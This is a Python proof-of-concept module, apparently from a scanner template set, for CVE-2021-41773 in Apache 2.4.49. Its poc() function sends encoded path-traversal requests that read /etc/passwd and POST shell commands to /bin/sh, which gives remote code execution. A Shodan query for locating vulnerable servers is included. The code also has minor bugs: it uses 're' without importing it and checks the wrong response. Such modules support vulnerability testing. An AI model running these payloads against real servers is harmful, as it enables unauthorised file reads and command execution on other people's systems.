import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache 2.4.49 - Path Traversal and Remote Code Execution''',
        "description": '''A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.''',
        "severity": "high",
        "references": [
            "https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-41773", 
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773", 
            "https://twitter.com/ptswarm/status/1445376079548624899", 
            "https://twitter.com/h4x0r_dz/status/1445401960371429381", 
            "https://github.com/blasty/CVE-2021-41773"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-41773",
            "cwe-id": "CWE-22"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''https://www.shodan.io/search?query=apache+version%3A2.4.49'''
        },
        "tags": ["cve", "cve2021", "lfi", "rce", "apache", "misconfig", "traversal"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh"""
        method = "POST"
        data = """echo Content-Type: text/plain; echo; echo COP-37714-1202-EVC | rev"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp1.text)) or ("""CVE-2021-41773-POC""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url